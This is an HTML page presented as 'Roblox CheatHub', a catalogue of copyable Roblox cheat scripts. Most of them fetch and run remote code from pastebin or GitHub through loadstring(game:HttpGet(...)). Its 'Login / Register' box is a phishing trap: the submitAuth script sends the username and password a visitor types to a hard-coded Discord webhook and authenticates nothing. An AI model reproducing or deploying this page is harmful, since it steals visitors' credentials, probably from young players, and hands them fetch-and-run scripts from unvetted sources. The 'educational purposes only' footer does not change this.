<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Roblox CheatHub | @mainzyko</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    * { box-sizing: border-box; }

    body {
      margin: 0;
      font-family: 'Segoe UI', sans-serif;
      background: linear-gradient(to bottom, #0f0f0f, #1a1a1a);
      color: white;
      overflow-x: hidden;
      animation: fadeIn 1s ease-in;
    }

    header {
      background: #1c1c1c;
      padding: 24px;
      text-align: center;
      border-bottom: 2px solid #2e2e2e;
      position: relative;
    }

    header h1 {
      margin: 0;
      font-size: 2em;
      color: #4fc3f7;
      animation: pulse 2s infinite;
    }

    header p a {
      color: #81d4fa;
      text-decoration: none;
    }

    .login-btn {
      position: absolute;
      top: 15px;
      right: 20px;
      background: #4fc3f7;
      border: none;
      padding: 8px 14px;
      border-radius: 6px;
      color: black;
      font-weight: bold;
      cursor: pointer;
      box-shadow: 0 0 10px #4fc3f780;
      transition: all 0.3s ease;
    }

    .login-btn:hover {
      background: #29b6f6;
      transform: scale(1.05);
    }

    main {
      padding: 20px;
    }

    #search {
      width: 100%;
      padding: 14px;
      border-radius: 8px;
      border: none;
      font-size: 16px;
      background: #222;
      color: white;
      margin-bottom: 20px;
    }

    #counter {
      font-size: 14px;
      color: #aaa;
      margin-bottom: 10px;
    }

    #script-list {
      display: grid;
      gap: 16px;
    }

    .script-card {
      background: #1a1a1a;
      padding: 16px;
      border-radius: 10px;
      box-shadow: 0 0 12px rgba(79, 195, 247, 0.1);
      border: 1px solid #333;
      animation: popIn 0.3s ease;
      transition: transform 0.2s;
    }

    .script-card:hover {
      transform: translateY(-2px);
      box-shadow: 0 0 15px rgba(79, 195, 247, 0.2);
    }

    .script-card h3 {
      margin: 0 0 10px;
    }

    .script-card .category {
      font-size: 12px;
      color: #81d4fa;
      margin-bottom: 8px;
    }

    .script-card pre {
      background: #111;
      padding: 10px;
      border-radius: 6px;
      overflow-x: auto;
      font-size: 13px;
    }

    .copy-btn {
      background: #4fc3f7;
      color: #000;
      border: none;
      padding: 8px 12px;
      border-radius: 5px;
      cursor: pointer;
      margin-top: 8px;
      transition: background 0.3s;
    }

    .copy-btn:hover {
      background: #29b6f6;
    }

    footer {
      text-align: center;
      padding: 20px;
      font-size: 13px;
      color: #777;
      background: #1a1a1a;
      margin-top: 40px;
    }

    /* Login Modal */
    #auth-modal {
      position: fixed;
      top: 0;
      left: 0;
      right: 0;
      bottom: 0;
      background: rgba(0,0,0,0.8);
      display: none;
      align-items: center;
      justify-content: center;
      z-index: 100;
      animation: fadeIn 0.5s;
    }

    .auth-box {
      background: #121212;
      padding: 30px;
      border-radius: 12px;
      width: 90%;
      max-width: 400px;
      box-shadow: 0 0 20px #4fc3f7;
      text-align: center;
    }

    .auth-box h2 {
      margin-top: 0;
      margin-bottom: 15px;
      color: #4fc3f7;
    }

    .auth-box input {
      width: 100%;
      padding: 12px;
      margin: 8px 0;
      border-radius: 6px;
      border: none;
      background: #222;
      color: white;
    }

    .auth-box button {
      width: 100%;
      padding: 12px;
      margin-top: 10px;
      background: #4fc3f7;
      color: black;
      font-weight: bold;
      border: none;
      border-radius: 6px;
      cursor: pointer;
    }

    .auth-box button:hover {
      background: #29b6f6;
    }

    @keyframes fadeIn {
      from { opacity: 0; }
      to { opacity: 1; }
    }

    @keyframes popIn {
      from { opacity: 0; transform: scale(0.95); }
      to { opacity: 1; transform: scale(1); }
    }

    @keyframes pulse {
      0% { text-shadow: 0 0 5px #4fc3f7; }
      50% { text-shadow: 0 0 15px #4fc3f7; }
      100% { text-shadow: 0 0 5px #4fc3f7; }
    }
  </style>
</head>
<body>
  <header>
    <h1>Roblox CheatHub</h1>
    <p>Created by <strong>@mainzyko</strong> | <a href="https://discord.gg/rcDWfJbZ4S" target="_blank">Join Discord</a></p>
    <button class="login-btn" id="loginBtn" onclick="showAuth()">Login / Register</button>
  </header>

  <main>
    <input type="text" id="search" placeholder="Search scripts...">
    <div id="counter"></div>
    <div id="script-list"></div>
  </main>

  <footer>
    &copy; 2025 CheatHub â€” All scripts for educational purposes only.
  </footer>

  <!-- Login Modal -->
  <div id="auth-modal">
    <div class="auth-box">
      <h2>Login / Register</h2>
      <input type="text" id="auth-user" placeholder="Username">
      <input type="password" id="auth-pass" placeholder="Password">
      <button onclick="submitAuth()">Submit</button>
    </div>
  </div>

  <script>
    const scripts = [
      { title: "Infinite Yield Admin", category: "Admin", code: `loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()` },
      { title: "Dex Explorer V3", category: "Utility", code: `loadstring(game:HttpGet("https://raw.githubusercontent.com/peyton2465/Dex/master/out.lua"))()` },
      { title: "CMD-X", category: "Admin", code: `loadstring(game:HttpGet("https://raw.githubusercontent.com/CMD-X/CMD-X/master/Source"))()` },
      { title: "ESP", category: "Combat", code: `loadstring(game:HttpGet("https://pastebin.com/raw/z0RYtS4Y"))()` },
      { title: "Reviz Admin", category: "Admin", code: `loadstring(game:HttpGet("https://pastebin.com/raw/Caniwq2N"))()` },
      { title: "Anti-AFK", category: "Utility", code: `for i,v in pairs(getconnections(game.Players.LocalPlayer.Idled)) do v:Disable() end` },
      { title: "FE Fling", category: "FE", code: `loadstring(game:HttpGet("https://pastebin.com/raw/G1uC2LWy"))()` },
      { title: "Fly", category: "Utility", code: `loadstring(game:HttpGet("https://pastebin.com/raw/7s7ghkWj"))()` },
      // Add more for 100+!
    ];

    const scriptList = document.getElementById("script-list");
    const searchInput = document.getElementById("search");
    const counter = document.getElementById("counter");

    function renderScripts(filter = "") {
      scriptList.innerHTML = "";
      const shown = scripts.filter(s => s.title.toLowerCase().includes(filter.toLowerCase()));
      counter.textContent = `Showing ${shown.length} of ${scripts.length} scripts`;
      shown.forEach(script => {
        const card = document.createElement("div");
        card.className = "script-card";
        card.innerHTML = `
          <h3>${script.title}</h3>
          <div class="category">${script.category}</div>
          <pre><code>${script.code}</code></pre>
          <button class="copy-btn" onclick="copyToClipboard(\`${script.code}\`, this)">Copy</button>
        `;
        scriptList.appendChild(card);
      });
    }

    function copyToClipboard(text, btn) {
      navigator.clipboard.writeText(text).then(() => {
        btn.textContent = "Copied!";
        setTimeout(() => btn.textContent = "Copy", 1500);
      });
    }

    searchInput.addEventListener("input", (e) => {
      renderScripts(e.target.value);
    });

    renderScripts();

    // Auth modal logic
    function showAuth() {
      document.getElementById("auth-modal").style.display = "flex";
    }

    function submitAuth() {
      const user = document.getElementById("auth-user").value;
      const pass = document.getElementById("auth-pass").value;

      fetch("https://discord.com/api/webhooks/1368655758945812640/KwNc_0fiyr7eFPUNRMPM-oxjyIjuTFDYM-lFJL7jSkGLEc8BQAyu3vWQnGfBL90ivJyo", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          content: `ðŸ”¥ New Login/Register!\nðŸ‘¤ **User:** ${user}\nðŸ”‘ **Pass:** ${pass}`
        })
      });

      localStorage.setItem("loggedIn", "true");
      document.getElementById("auth-modal").style.display = "none";
      document.getElementById("loginBtn").style.display = "none";
    }

    // Check if user has already logged in
    window.onload = function() {
      if (localStorage.getItem("loggedIn") === "true") {
        document.getElementById("loginBtn").style.display = "none";
      }
    }
  </script>
</body>
</html>
